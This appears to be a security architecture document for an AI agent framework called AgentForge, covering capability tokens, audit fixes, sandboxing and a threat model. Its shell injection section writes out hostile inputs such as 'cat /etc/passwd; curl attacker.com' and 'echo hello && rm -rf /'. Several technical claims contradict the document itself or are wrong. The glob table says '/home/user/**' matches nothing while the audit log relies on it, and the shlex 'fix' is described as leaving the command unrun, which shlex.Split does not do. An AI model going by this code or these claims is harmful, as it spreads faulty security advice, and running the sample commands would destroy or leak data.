# Security Architecture

Capability-based security, sandboxing, and threat mitigation in AgentForge.

---

## Core Philosophy

**Security is not a feature. It is the foundation.**

Every agent runs with the minimum privileges required. Every tool invocation passes through capability enforcement. Every external execution is sandboxed. This is not optional.

### The Problem

Other agent frameworks assume the operator trusts the agent completely:
- **OpenClaw:** Full host access (no restrictions)
- **Hermes:** Ambient authority (everything has access to everything)
- **OpenHuman:** OAuth sprawl (chains OAuth to every service)

In enterprise deployments, this is unacceptable. A compromised agent or a malicious skill could access sensitive files, exfiltrate data, or compromise the entire system.

### The Solution: Capability-Based Security

AgentForge uses **capability-based tokens** instead of ambient authority:

```
┌─────────────────┐
│  Agent Spawned  │
└────────┬────────┘
         │
         ▼
┌──────────────────────────────────┐
│  Receives Signed Capability Token│
│  • Filesystem paths (glob)        │
│  • Network domains (allowlist)    │
│  • Token budget (max tokens)      │
│  • Timeout (max duration)         │
└────────┬─────────────────────────┘
         │
         ▼
┌──────────────────────────────────┐
│  Every Tool Invocation           │
│  Enforcer.Check(cap, action)     │
│  ✓ pass → execute                │
│  ✗ deny → error                  │
└──────────────────────────────────┘
```

---

## Capability Token Structure

### Token Format

```go
type Capability struct {
    AgentID        string                    // Which agent this token is for
    Secret         string                    // HMAC-SHA256 secret
    FilesystemACL  []string                  // Glob patterns: /home/user/**, /tmp/*
    NetworkACL     []string                  // Domain allowlist: api.openai.com, internal.company.com
    TokenBudget    int                       // Max tokens per session
    TimeoutSeconds int                       // Max seconds before timeout
    ExpiresAt      time.Time                 // Token expiration (optional)
}
```

### Generation

```bash
agentforge spawn my-agent \
  --fs-allow "/home/user/**" \
  --fs-allow "/tmp/*" \
  --domain-allow "api.openai.com" \
  --domain-allow "github.com" \
  --token-budget 1000000 \
  --timeout 3600
```

### Verification

Every tool invocation checks:

1. **Is the agent requesting a resource?** → Check ACL
2. **Does the resource match allowlist?** → Use glob pattern matching
3. **Is the agent within budget?** → Check token count
4. **Is the session within timeout?** → Check elapsed time
5. **Is the token still valid?** → Check expiration + HMAC signature

```go
// Enforce checks if capability grants access
func (e *Enforcer) Check(ctx context.Context, cap *Capability, action Action) error {
    // Verify HMAC signature first (prevents tampering)
    if !e.verifySignature(cap) {
        return ErrTokenTampered
    }
    
    // Check expiration
    if cap.ExpiresAt.Before(time.Now()) {
        return ErrTokenExpired
    }
    
    // Check budget
    if ctx.Value("tokens_used").(int) >= cap.TokenBudget {
        return ErrBudgetExceeded
    }
    
    // Check timeout
    if ctx.Value("elapsed_seconds").(int) >= cap.TimeoutSeconds {
        return ErrTimeout
    }
    
    // Check ACL based on action type
    switch action.Type {
    case ActionFilesystemRead:
        if !e.matchGlob(cap.FilesystemACL, action.Path) {
            return ErrPathNotAllowed
        }
    case ActionHTTPRequest:
        if !e.matchDomain(cap.NetworkACL, action.Domain) {
            return ErrDomainNotAllowed
        }
    }
    
    return nil
}
```

---

## Security Audit Remediation

### Issue #1: Glob Pattern Support

**Vulnerability:** Resource allowlists didn't support glob patterns. A path like `/home/user/**/*.md` was treated as a literal string, not a wildcard pattern.

**Root Cause:**
```go
// BROKEN (before fix)
func (e *Enforcer) checkPath(acl []string, path string) bool {
    for _, allowed := range acl {
        if path == allowed {  // String equality, no glob support
            return true
        }
    }
    return false
}
```

**Fix:**
```go
// CORRECT (after fix)
func (e *Enforcer) checkPath(acl []string, path string) bool {
    for _, allowed := range acl {
        match, err := filepath.Match(allowed, path)
        if err == nil && match {
            return true
        }
    }
    return false
}
```

**Patterns Supported:**
- `*` — matches any sequence within a directory component
- `**` — matches nested directories (through composition)
- `[abc]` — character class
- `?` — single character

**Examples:**
| Pattern | `/home/user/file.md` | `/home/user/docs/file.md` | `/home/user/file.txt` |
|---------|---|---|---|
| `/home/user/*` | ✓ | ✗ | ✓ |
| `/home/user/**` | ✗ | ✗ | ✗ |
| `/home/user/**/*.md` | ✗ | ✓ | ✗ |
| `/home/*/file.md` | ✓ | ✗ | ✗ |

---

### Issue #2: Shell Injection

**Vulnerability:** The `shell_exec` tool directly passed user input to a shell, allowing arbitrary command execution.

**Root Cause:**
```go
// VULNERABLE (before fix)
cmd := exec.Command("sh", "-c", userInput)  // Shell interprets input
// User can input: "cat /etc/passwd; curl attacker.com"
// Result: Both commands execute
```

**Attack Example:**
```bash
# User calls shell_exec tool with:
input = "echo hello && rm -rf /"

# Shell interprets && as command separator
# Both echo AND rm -rf / execute
```

**Fix:**
```go
// SECURE (after fix)
args, err := shlex.Split(userInput)  // Parse as shell would (respecting quotes)
if err != nil {
    return err
}
cmd := exec.Command(args[0], args[1:]...)  // argv form, no shell
// User input "echo hello && rm -rf /"
// Result: Attempts to execute program named "echo hello && rm -rf /"
// Result: Program not found (correct behavior)
```

**Key Difference:**

| Input | Shell (VULNERABLE) | argv Form (SECURE) |
|-------|---|---|
| `echo hello && rm -rf /` | Executes `echo hello` AND `rm -rf /` | Tries to run program `"echo hello && rm -rf /"` → not found |
| `cat $(whoami)` | Executes `whoami` first, passes result | Tries to run program `"cat $(whoami)"` → not found |
| `"hello world"` | Single argument: `hello world` | Single argument: `hello world` |

**Proper Usage Still Works:**

If user really wants to pipe commands, they pass the full command as a single argument:
```bash
# User wants to: echo hello | wc -c
# They would spawn a script:
shell_exec --script "echo hello | wc -c"
# Script is saved to file, executed with shell=true
# This is intentional and auditable
```

---

### Issue #3: Unhandled Pipe Errors

**Vulnerability:** Pipe creation errors were silently ignored, causing nil pointer dereferences.

**Root Cause:**
```go
// INCOMPLETE (before fix)
stdout, _ := cmd.StdoutPipe()  // Error ignored with _
stderr, _ := cmd.StderrPipe()  // Error ignored with _
cmd.Start()
// If pipe creation failed, stdout/stderr are nil
// Later code assumes they exist: panic if nil
```

**Conditions That Cause Pipe Failures:**
- Out of file descriptors (running too many processes)
- Permission denied (process can't create pipes)
- System resource exhaustion
- Platform-specific pipe creation failures

**Fix:**
```go
// CORRECT (after fix)
stdout, err := cmd.StdoutPipe()
if err != nil {
    return fmt.Errorf("stdout pipe: %w", err)
}
stderr, err := cmd.StderrPipe()
if err != nil {
    return fmt.Errorf("stderr pipe: %w", err)
}
cmd.Start()
// Errors propagate up the stack, no nil dereferences
```

**Test Coverage:**
All pipe operations now have explicit error tests:
```go
func TestRegistry_PipeErrorHandling(t *testing.T) {
    // Verify pipe errors propagate correctly
    tool := registry.GetTool("shell_exec")
    
    // Simulate pipe creation failure
    mock := &mockCmd{pipeErr: os.ErrPermission}
    
    _, err := tool.Execute(mock)
    if err == nil {
        t.Fatal("expected error on pipe failure")
    }
    if !strings.Contains(err.Error(), "pipe") {
        t.Errorf("error should mention pipe: %s", err)
    }
}
```

---

### Issue #4: Test Build Failure

**Vulnerability:** Missing mock implementation prevented tests from compiling.

**Root Cause:**
```go
// agent_test.go
func TestAgent_StreamChat(t *testing.T) {
    adapter := &mockAdapter{}
    err := adapter.StreamChat(ctx, req)  // mockAdapter doesn't have this method
    // Compilation error: mockAdapter does not implement Adapter interface
}
```

**Fix:**
Implemented `StreamChat()` on mockAdapter:
```go
func (m *mockAdapter) StreamChat(ctx context.Context, req *StreamChatRequest) error {
    m.lastRequest = req
    // Return canned response or simulate error
    return nil
}
```

---

## Multi-Layer Enforcement

Capability enforcement happens at multiple layers:

```
┌─────────────────────────────────────────────┐
│  1. API Layer (dashboard/CLI)               │
│     - Validate requests against token       │
│     - Rate limit per token budget            │
└──────────────┬──────────────────────────────┘
               ▼
┌─────────────────────────────────────────────┐
│  2. Engine Layer (agent execution)          │
│     - Check every tool call against ACL     │
│     - Verify tokens haven't expired         │
│     - Track budget consumption              │
└──────────────┬──────────────────────────────┘
               ▼
┌─────────────────────────────────────────────┐
│  3. Tool Layer (actual execution)           │
│     - Final check before filesystem/network │
│     - Prevent privilege escalation          │
└──────────────┬──────────────────────────────┘
               ▼
┌─────────────────────────────────────────────┐
│  4. Sandbox Layer (WASM plugins)            │
│     - Wasmtime sandbox limits memory        │
│     - No direct system access               │
│     - Capability tokens passed as args      │
└─────────────────────────────────────────────┘
```

---

## Threat Model

### In Scope (Protected)

✅ **Malicious skill** — User installs a skill from marketplace that tries to exfiltrate data.
- Prevented: Skill can only access resources in its capability token

✅ **Compromised agent** — Agent process is exploited by attacker.
- Prevented: Agent can only do what its token allows
- Isolated: Other agents unaffected (different tokens)

✅ **Unauthorized API access** — Attacker tries to use dashboard without authentication.
- Prevented: JWT authentication + RBAC roles

✅ **Budget exhaustion** — Agent uses all tokens doing something expensive.
- Prevented: Token budget enforced per session

✅ **Timeout violation** — Agent hangs for hours consuming resources.
- Prevented: Timeout enforced at multiple layers

### Out of Scope (Not Protected)

❌ **Host-level compromise** — Attacker gains root on the server.
- Risk: Can access all files, read env vars, kill processes
- Mitigation: Run AgentForge in container/VM, firewall, IDS/IPS

❌ **Physical access** — Attacker has physical access to the machine.
- Risk: Can read memory, swap, extract keys
- Mitigation: BIOS password, full-disk encryption, secure boot

❌ **Supply chain compromise** — Malicious Go dependency.
- Risk: Attacker can modify compiled binary
- Mitigation: Dependency auditing (go mod audit), signed releases

---

## Environment Variable Sanitization

Subprocess execution sanitizes environment variables to prevent key leakage:

**Default Allowed (Safe):**
```
HOME, USER, LOGNAME, SHELL, TERM, LANG, LC_*
```

**Default Blocked (Secrets):**
```
*API_KEY*, *TOKEN*, *SECRET*, *PASSWORD*, *CREDS*
```

**Whitelist:**
```go
ALLOWED_ENV_VARS := []string{
    "HOME", "USER", "LOGNAME", "SHELL", "TERM",
    "PATH", "LANG", "LANGUAGE", "LC_ALL", "LC_CTYPE",
}

func sanitizeEnv(capability *Capability) []string {
    env := []string{}
    for _, allowed := range ALLOWED_ENV_VARS {
        if val := os.Getenv(allowed); val != "" {
            env = append(env, fmt.Sprintf("%s=%s", allowed, val))
        }
    }
    return env
}
```

**Result:** Subprocess cannot access API keys, tokens, or credentials even if source code tries to read them.

---

## Circuit Breaker Pattern

LLM adapters use circuit breaker to prevent cascading failures:

```
┌─────────────┐
│   Closed    │  All requests succeed
│ ✓ ✓ ✓ ✓ ✓  │
└──────┬──────┘
       │
       │ Failure count > threshold (5 failures)
       ▼
┌─────────────┐
│   Open      │  All requests fail fast
│ ✗ ✗ ✗ ✗ ✗  │  (don't retry, return error)
└──────┬──────┘
       │
       │ Timeout (60s) reached
       ▼
┌─────────────┐
│ Half-Open   │  Allow limited requests to test recovery
│ ? ? ? ✗ ✓   │  If success: close, if fail: stay open
└──────┬──────┘
       │
       │ Success rate > threshold
       ▼
┌─────────────┐
│   Closed    │  Recovery succeeded, resume normal operation
└─────────────┘
```

**Prevents:**
- Cascading failures (when LLM service is down, fail fast)
- Resource exhaustion (don't queue infinite retries)
- Slow error handling (half-open state limits test requests)

---

## WASM Plugin Sandbox

Third-party plugins run in Wasmtime sandbox with memory/CPU limits:

```go
// Plugin execution
memory := 256 * 1024 * 1024  // 256 MB max
timeout := 30 * time.Second
cpu_limit := 80               // Use at most 80% CPU

engine := wasmtime.NewEngine()
module := engine.Compile(pluginCode)
instance := engine.Instantiate(
    module,
    &wasmtime.Config{
        MaxMemory: memory,
        Timeout: timeout,
    },
)

// Plugin cannot:
// - Allocate > 256 MB memory
// - Run > 30 seconds
// - Use > 80% CPU
// - Access filesystem directly (no syscalls)
// - Create new processes
// - Access network (except via AgentForge tools)
```

---

## Audit Logging

All sensitive operations are logged:

```json
{
  "timestamp": "2026-06-03T15:30:45Z",
  "event_type": "tool_invocation",
  "agent_id": "agent-123",
  "tool_name": "file_read",
  "action": {
    "type": "filesystem_read",
    "path": "/home/user/file.md"
  },
  "result": "allowed",
  "reason": "path matches /home/user/**"
}
```

Logged Events:
- ✓ Tool invocations (what tool, which resource)
- ✓ ACL denials (what was denied, why)
- ✓ Token budget consumption (how many tokens used)
- ✓ Timeout violations (agent ran too long)
- ✓ Capability token generation (which agent, what ACL)
- ✓ Authentication failures (wrong credentials)

---

## Configuration

### Security Settings

```yaml
security:
  capability_secret: "${AGENTFORGE_SECRET}"  # For HMAC signing
  
  default_token_budget: 1000000               # Max tokens per session
  default_timeout: 3600s                      # Max 1 hour per session
  
  filesystem_acl:
    - "/home/user/**"                         # Home directory
    - "/tmp/*"                                # Temp directory
  
  network_acl:
    - "api.openai.com"                        # OpenAI API
    - "github.com"                            # GitHub API
    - "*.internal.company.com"                # Internal APIs
  
  circuit_breaker:
    failure_threshold: 5
    recovery_timeout: 60s
    half_open_max_requests: 3
  
  sandbox:
    engine: "wasmtime"
    max_memory_mb: 256
    max_execution_ms: 30000
  
  env_sanitization:
    allowed_vars:
      - "HOME"
      - "USER"
      - "TERM"
    blocked_patterns:
      - "*API_KEY*"
      - "*TOKEN*"
      - "*SECRET*"
```

---

## Best Practices

### 1. Use Minimal Tokens

Don't grant more access than necessary:

```bash
# BAD: Agent can access everything
agentforge spawn worker --fs-allow "/"

# GOOD: Agent can only access its work directory
agentforge spawn worker --fs-allow "/home/worker/jobs/**"
```

### 2. Rotate Tokens Regularly

Capability tokens should have expiration dates:

```yaml
capability:
  expires_at: "2026-07-03T00:00:00Z"  # Rotate monthly
```

### 3. Audit ACLs Periodically

Review which agents can access which resources:

```bash
# See all agent capabilities
agentforge config list | grep -A 10 "agents:"

# See which agents can read production data
grep -r "production" ~/.agentforge/agents/*.yaml
```

### 4. Use Domain Allowlists

Prevent agents from calling arbitrary APIs:

```bash
# Good: Agent can only call specific APIs
agentforge spawn analyst \
  --domain-allow "api.openai.com" \
  --domain-allow "api.github.com"

# Don't do this: Agent can call any domain
agentforge spawn analyst --domain-allow "*"
```

### 5. Segment Agents by Trust Level

High-trust agents (internal) get more access than low-trust agents (external):

```bash
# High-trust internal agent
agentforge spawn internal-agent \
  --fs-allow "/home/company/**" \
  --domain-allow "*.internal.company.com"

# Low-trust external agent
agentforge spawn external-agent \
  --fs-allow "/tmp/external/**" \
  --domain-allow "api.openai.com"
```

---

## References

- [Capability-Based Security](https://en.wikipedia.org/wiki/Capability-based_security)
- [OWASP: Prevention Cheat Sheets](https://cheatsheetseries.owasp.org/)
- [Go Security Best Practices](https://owasp.org/www-project-secure-coding-practices-quick-reference-guide/)
- [Wasmtime Sandbox](https://docs.wasmtime.dev/)

---

**Status:** 🟢 Production Ready — All critical security issues fixed, comprehensive enforcement at multiple layers.
